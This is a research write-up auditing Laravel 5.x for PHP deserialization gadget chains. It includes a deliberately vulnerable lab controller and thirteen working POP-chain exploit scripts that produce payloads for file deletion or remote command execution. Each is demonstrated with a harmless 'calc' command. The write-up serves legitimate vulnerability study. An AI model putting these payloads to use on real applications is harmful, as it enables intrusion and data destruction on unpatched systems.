# Laravel5.1 Code Audit

Author: H3rmesk1t

This article was first published on [Safe](https://www.anquanke.com/post/id/258264)

# Preface
When doing web-type questions, I found that there are questions about `PHP framework vulnerabilities` in the web introductory questions in the ctfshow platform. Try to mine the chain by yourself and further learn the chain mining method of deserialization in the framework class.

# Pre-knowledge
## Definition
Serialization (serialization): is the process of converting variables into strings that can be saved or transferred;
Deserialization (reserialization): It is to convert this string into the original variable and use it at appropriate times;
These two processes combine to easily store and transfer data, making the program more maintainable;
The common methods of php serialization and deserialization are: serialize, unserialize

## Common magic methods
```
__construct(), the constructor of the class
__destruct(), class destructor
__call(), called when an inaccessible method is called in the object
__callStatic(), called when an inaccessible method is called in static mode
__get(), called when obtaining a member variable of a class
__set(), called when setting a member variable of a class
__isset(), called when isset() or empty() is called for inaccessible properties
__unset(), called when unset() is called for inaccessible properties
__sleep(), when executing serialize(), this function will be called first
__wakeup(), when executing unserialize(), this function will be called first
__toString(), the response method of the class when it is treated as a string
__invoke(), the response method when calling an object by calling a function
__set_state(), when var_export() is called to export the class, this static method will be called
__clone(), called when object copying is completed
__autoload(), attempt to load an undefined class
__debugInfo(), print the required debugging information
```

## Find a way
Common ideas for finding deserialization chains are global search for the `__destruct()` method, `__wakeup()` method or direct search for the `unserialize()` method

# Vulnerability Scope
Laravel <= 5.5

#Environmental construction
## Source code download
When I was auditing the `ThinkPHP6.x` code before, the source code pulled through `composer` could not be opened to the mining chain. In order to avoid this problem, I directly found the previous `Laravel5.5` source code online, [Download link] (https://anonfiles.com/j5edufSaud/laravel55_zip)
## Environment Deployment
Add routes in `routes/web.php`

```php
Route::get('/', "DemoController@demo");
```

Add controllers in the `app/Http/Controllers` directory

```php
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
class DemoController extends Controller
{
    public function demo()
    {
        highlight_file(__FILE__);
        if(isset($_GET['data'])){
            $filename = "C:\Tools\phpstudy_pro\WWW\laravel55\public\info.php";
            @unserialize(base64_decode($_GET['data']));
            if(file_exists($filename)){
                echo $filename." is exit!".PHP_EOL;
            }else{
                echo $filename." has been deleted!".PHP_EOL;
            }
        }
    }
}
```
Build the source code with a small leather panel, visit `http://127.0.0.1/laravel55/public/index.php`, and the following page appears to indicate that the environment deployment is successful

![undefined](https://p5.ssl.qhimg.com/t01ca00faceddc23d63.png "undefined")

# Vulnerability Analysis
## POP Chain-1 (Arbitrary File Deletion Vulnerability)
Follow up on the `__destruct()` method in `Pipes/WindowsPipes.php` and found that it called a `removeFiles()` method. After following it, it found that it was a simple arbitrary file deletion vulnerability.

![undefined](https://p0.ssl.qhimg.com/t01ac4cd5acefa47ad3.png "undefined")

### exp

```php
<?php
namespace Symfony\Component\Process\Pipes {
    class WindowsPipes {
        private $files = array();
        function __construct() {
            $this->files = array("C:/Tools/phpstudy_pro/WWW/laravel51/public/info.php");
        }
    }
    echo base64_encode(serialize(new WindowsPipes()));
}
?>
```

![](https://p2.ssl.qhimg.com/t01e9d1c102c6fa2130.png)

![](https://p0.ssl.qhimg.com/t01ad3b15be7188726f.png)

## POP Chain-2
Follow up on the `__destruct()` method in `src/Illuminate/Broadcasting/PendingBroadcast.php` and found that `$this->events` and `$this->events` are both controllable, so you can find a `__call()` method or `dispatch()` method to utilize it.

First use `__call()` to make a breakthrough point, follow up on the `__call()` method in `src/Faker/Generator.php`, and find that it called the `format()` method, and then called the `getFormatter()` method.

![](https://p3.ssl.qhimg.com/t01693e24f56c873248.png)

Since the $this->formatters[$formatter]` in the `getFormatter()` method is controllable and returns directly to the previous layer, you can use this controllable parameter to perform RCE operations in commands.

### exp
```php
<?php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        function __construct($events="", $event="") {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct($func="") {
            $this->formatters = ['dispatch' => $func];
        }
    }
}

namespace {
    $demo1 = new Faker\Generator("system");
    $demo2 = new Illuminate\Broadcasting\PendingBroadcast($demo1, "calc");
    echo base64_encode(serialize($demo2));
}
?>
```
### POP chain utilization flow chart

![](https://p4.ssl.qhimg.com/t01fd65d2d1dcf5a1ee.png)

## POP Chain-3
Continue to look for the available `__call()` method above, follow up on the `__call()` method in `src/Illuminate/Validation/Validator.php`, first perform the string operation and intercept the characters after the eighth character of `$method`. Since the string passed is `dispatch`, it is exactly eight characters, so it is empty after passing in. Then, call the `callExtension()` method through the if logic to trigger the `call_user_func_array` method

![undefined](https://p4.ssl.qhimg.com/t01efbb54c2cba095e0.png "undefined")

### ex
p
```php
<?php
namespace Illuminate\Validation {
    class Validator {
       public $extensions = [];
       public function __construct() {
            $this->extensions = ['' => 'system'];
       }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Validation\Validator;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Validator();
            $this->event = $cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('calc')));
}
?>
```
### POP chain utilization flow chart
![](https://p0.ssl.qhimg.com/t01ddaee826a4457217.png)

## POP Chain-4
Follow up on the `__call()` method in `src/Illuminate/Support/Manager.php`, which calls the `driver()` method

![](https://p1.ssl.qhimg.com/t01c6ae4cbc19ab85f4.png "undefined")

Follow up on the `createDriver()` method, call the `callCustomCreator()` method when `$this->customCreators[$driver]` exists, and further follow up on the `callCustomCreator()` method. It is found that `$this->customCreators[$driver]` and `$this->app)` are both controllable, so RCE can be triggered.

![](https://p0.ssl.qhimg.com/t011e21a2d3da39647d.png "undefined")

### exp
```php
<?php
namespace Illuminate\Notifications {
    class ChannelManager {
        protected $app;
        protected $customCreators;
        protected $defaultChannel;
        public function __construct() {
            $this->app = 'calc';
            $this->defaultChannel = 'H3rmesk1t';
            $this->customCreators = ['H3rmesk1t' => 'system'];
        }
    }
}


namespace Illuminate\Broadcasting {
    use Illuminate\Notifications\ChannelManager;
    class PendingBroadcast {
        protected $events;
        public function __construct()
        {
            $this->events = new ChannelManager();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP chain utilization flow chart

![](https://p1.ssl.qhimg.com/t01897b941b5103d8dc.png "undefined")

## POP Chain-5
I roughly read the `__call()` method that is basically useless (it's too bad to find), so I started to follow the `dispath()` method

![undefined](https://p0.ssl.qhimg.com/t01b2b0557300f7f989.png "undefined")

First follow up on the `dispatch()` method in `src/Illuminate/Events/Dispatcher.php`, notice `$listener($event, $payload)`, and try to use this as a breakthrough to implement RCE

![](https://p5.ssl.qhimg.com/t01882a2ac886bde391.png "undefined")

See how the value of `$listener` comes from, follow up on the `getListeners()` method. Here you can first control the value of `$listener` through the controllable variable `$this->listeners[$eventName]`, then enter the combination function, call the `getWildcardListeners()` method, follow up and take a look. After the default settings are executed, it will return `$wildcards = []`, and then return to the value of `$this->listeners[$eventName]` after the combination function merge is still `$this->listeners[$eventName]`, and then enter the `class_exists()` function. Since there is no class name for the command execution function, you can still return the value of `$this->listeners[$eventName]`

![undefined](https://p4.ssl.qhimg.com/t014aca56b2a02516aa.png "undefined")

After controlling the value of `$listener`, use the passed value of `$event` as the parameter value of the command execution function to perform RCE operation

### exp
```php
<?php
namespace Illuminate\Events {
    class Dispatcher {
        protected $listeners = [];
        public function __construct() {
            $this->listeners = ["calc" => ["system"]];
        }
    }
}



namespace Illuminate\Broadcasting {
    use Illuminate\Events\Dispatcher;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = "calc";
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p3.ssl.qhimg.com/t0168ad9a2bff687e2f.png "undefined")

## POP Chain-6
Continue to follow the `dispatch()` method, follow the `dispatch()` method in `src/Illuminate/Bus/Dispatcher.php`, notice that if the method is judged to be true, it will enter the `dispatchToQueue()` method, follow the `dispatchToQueue()` method and find the `call_user_func()` method.

![undefined](https://p3.ssl.qhimg.com/t01e6a9a1a6100e9667.png "undefined")

First, see how to enter the loop of the if statement. First, `$this->queueResolver` is controllable. Follow up on the `commandShouldBeQueued()` method. Here we determine whether `$command` is an implementation of `ShouldQueue`, that is, the passed `$command` must be an implementation of the `ShouldQueue` interface, and the `$command` class contains the `connection` attribute

![](https://p4.ssl.qhimg.com/t01367152dbc7f202a2.png "undefined")

Here we find two `SendQueuedNotifications` class in `src/Illuminate/Notifications/SendQueuedNotifications.php` and `BroadcastEvent` class in `src/Illuminate/Broadcasting/BroadcastEvent.php`. When the class is a trait class, it can also access its properties. Follow up on `sr
c/Illuminate/Bus/Queueable.php`

![undefined](https://p3.ssl.qhimg.com/t01e456ca37067ba2e3.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t017b7422608496417f.png "undefined")

![undefined](https://p4.ssl.qhimg.com/t01f999c8bef616f299.png "undefined")

### exp
```php
<?php
namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver = "system";
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    class BroadcastEvent {
        public $connection;
        public $event;
        public function __construct() {
            $this->event = "calc";
            $this->connection = $this->event;
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p5.ssl.qhimg.com/t0128e03ec10214febd.png "undefined")

## POP Chain-7
Continue to continue the `call_user_func()` method of the previous chain. Since the variables are controllable, you can call methods of any class and follow up with the `load()` method in `library/Mockery/Loader/EvalLoader.php`. If you do not enter the if loop and trigger the `getCode()` method, you can cause any code execution vulnerability.

![undefined](https://p4.ssl.qhimg.com/t016931a8ff7a493d3a.png "undefined")

Look at the judgment conditions of the if loop and follow up the call all the way. Since the last `$this->name` is controllable, you only need to assign it a non-existent class name value. There are many methods available for use, just choose one that can be used.

![undefined](https://p2.ssl.qhimg.com/t01cd6d0337cb7b6592.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t01a97a79073d0c1170.png "undefined")

### exp-1
```php
<?php
namespace Mockery\Generator {
    class MockConfiguration {
        protected $name = 'H3rmesk1t';
    }
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct() {
            $this->config = new MockConfiguration();
            $this->code = "<?php system('calc');?>";
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition();
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

### exp-2
```php
<?php
namespace Symfony\Component\HttpFoundation {
    class Cookie {
        protected $name = "H3rmesk1t";
    }
}

namespace Mockery\Generator {
    use Symfony\Component\HttpFoundation\Cookie;
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct($code) {
            $this->config = new cookie();
            $this->code = $code;
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition("<?php system('calc');?>");
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
$this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p4.ssl.qhimg.com/t016d292a9d69431ac1.png "undefined")

## POP Chain-8
Follow up on the `__destruct()` method in `lib/classes/Swift/KeyCache/DiskKeyCache.php`, where `$this->_keys` is controllable

![undefined](https://p3.ssl.qhimg.com/t013ca6184c5c91be9d.png "undefined")

Continue to look at the `clearAll()` method called in foreach. When `array_key_exists()` is judged to be true, enter foreach, and then call the `clearKey()` method. After entering if judgment, call the `hasKey()` method. Since the `$this->_path` here is controllable, you can assign it a value to a class name to trigger the `__toString()` method in this class

![undefined](https://p4.ssl.qhimg.com/t012a9c30fd94199e4b.png "undefined")

Here you can select the `__toString()` method in `library/Mockery/Generator/DefinedTargetClass.php` as the trigger point. It will first call the `getName()` method, and the `$this->rfc` in the method is controllable, so you can trigger a class without the `getName()` method to trigger the `__call()` method in the class.

![undefined](https://p5.ssl.qhimg.com/t014698c2b0cbc67092.png "undefined")

Search the `__call()` method globally, follow up with the `__call()` method in `src/Faker/ValidGenerator.php`. The `$this->validator` in the while statement is controllable. When `$res` can be a parameter of the command execution function, the command execution RCE can be triggered. Since `$this->generator` is also controllable, you can find a method class that can return parameter values ​​to achieve the purpose of returning command execution function parameters and thus RCE

![undefined](https://p0.ssl.qhimg.com/t017d6656e10983d2b4.png "undefined")

Here you can use `src/Faker/DefaultGenerator.php` as the trigger point. When the currently set method does not exist, the `__call()` method will be triggered, thereby returning the value of the controllable parameter `$this->default`
 
![undefined](https://p1.ssl.qhimg.com/t01a495401089c8e278.png "undefined")

### exp
```php
<?php
namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($payload) {
            $this->default = $payload;
        }
    }
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($payload) {
            $this->generator = new DefaultGenerator($payload);
            $this->validator = "system";
            $this->maxRetries = 1; // If the value is not set, it is repeated 10,000 times by default.
        }
    }
}

namespace Mockery\Generator {
    use Faker\ValidGenerator;
    class DefinedTargetClass {
        private $rfc;
        public function __construct($payload) {
            $this->rfc = new ValidGenerator($payload);
        }
    }
}

namespace {
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new DefinedTargetClass($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p3.ssl.qhimg.com/t01d3043fe36903dc33.png "undefined")

## POP Chain-9
The utilization chain of the start and end points is the same as the `POP chain-8`. Change the trigger point of `__toString()` and follow up the `__toString()` method in `lib/classes/Swift/Mime/SimpleMimeEntity.php`. It calls the `toString()` method. Since `$this->_headers` is controllable, you can use the `__call()` method of the previous chain for RCE operation.

![undefined](https://p5.ssl.qhimg.com/t0159a7d1c51ac10591.png "undefined")

### exp
```php
<?php
namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($payload) {
            $this->default = $payload;
        }
    }
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($payload) {
            $this->generator = new DefaultGenerator($payload);
            $this->validator = "system";
            $this->maxRetries = 1; // If the value is not set, it is repeated 10,000 times by default.
        }
    }
}

namespace {
    use Faker\ValidGenerator;
    class Swift_Mime_SimpleMimeEntity {
        private $headers;
        public function __construct($payload) {
            $this->headers = new ValidGenerator($payload);
        }
    }
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new Swift_Mime_SimpleMimeEntity($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCa
che_DiskKeyCache("calc")));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p3.ssl.qhimg.com/t01ef5842b0f04120d0.png "undefined")

## POP Chain-10
The starting point is the same as `POP chain-8`. Starting from `__toString()`, follow up on the `__toString()` method in `src/Prophecy/Argument/Token/ObjectStateToken.php`. Here `$this->util` and `$this->value` are both controllable.

![undefined](https://p0.ssl.qhimg.com/t01c53ae21f69eebfb4.png "undefined")

Then, use the `__call()` trigger method in the second half of `POP chain-2` to perform command execution operations to achieve RCE

### exp
```php
<?php
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ObjectStateToken {
        private $name;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = "H3rmesk1t";
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ObjectStateToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ObjectStateToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p0.ssl.qhimg.com/t01c318e6f5ac9a107c.png "undefined")

## POP Chain-11
The utilization chain of the starting point and end point is the same as the `POP chain-10`. Change the trigger point of `__toString()` and follow up on the `__toString()` method in `src/Prophecy/Argument/Token/IdenticalValueToken.php`. Here `$this->string`, `$this->util` and `$this->value` are all controllable.

![undefined](https://p3.ssl.qhimg.com/t0114475595f218992c.png "undefined")

### exp
```php
<?php
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class IdenticalValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\IdenticalValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new IdenticalValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p0.ssl.qhimg.com/t01b6ad60364791668b.png "undefined")

## POP Chain-12
The utilization chain of the starting point and end point is the same as `POP chain-10`. Change the trigger point of `__toString()` and follow up on the `__toString()` method in `src/Prophecy/Argument/Token/ExactValueToken.php`. Here `$this->string`, `$this->util` and `$this->value` are all controllable.

![undefined](https://p0.ssl.qhimg.com/t01791efaeaeeaa72ec.png "undefined")

### exp
```php
<?php
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ExactValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ExactValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ExactValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP chain utilization process
picture

![undefined](https://p0.ssl.qhimg.com/t018e7431dc08dd992c.png "undefined")

## POP Chain-13
The first half of the chain is the same as other chains before. As long as the `__call()` method can be triggered), then follow up on the `__call()` method in `src/Illuminate/Database/DatabaseManager.php`, which calls the `connection()` method, follow up. Here you need to enter the `makeConnection()` method to use the `call_user_func()` method to perform RCE

![undefined](https://p1.ssl.qhimg.com/t01041c2aa66c1f1cad.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t01484d0c48b1130516.png "undefined")

Follow up on the `getConfig()` method and continue to follow up on the `Arr::get($connections, $name)`. You can see that the value of `$config` returned through the `get()` method is controllable. You can return the command execution function back, resulting in RCE

![undefined](https://p0.ssl.qhimg.com/t01d87acb0b55e8f265.png "undefined")

![undefined](https://p5.ssl.qhimg.com/t014d438b111c23f23c.png "undefined")

### exp
```php
<?php
namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions ;
        public function __construct($payload)
        {
            $this->app['config']['database.default'] = $payload;
            $this->app['config']['database.connections'] = [$payload => 'system'];
            $this->extensions[$payload]='call_user_func';
        }
    }
}

namespace Mockery\Generator {
    use Illuminate\Database\DatabaseManager;
    class DefinedTargetClass {
        private $rfc;
        public function __construct($payload) {
            $this->rfc = new DatabaseManager($payload);
        }
    }
}

namespace {
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new DefinedTargetClass($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP chain utilization flow chart

![undefined](https://p1.ssl.qhimg.com/t01e9eeb38689dddbee.png "undefined")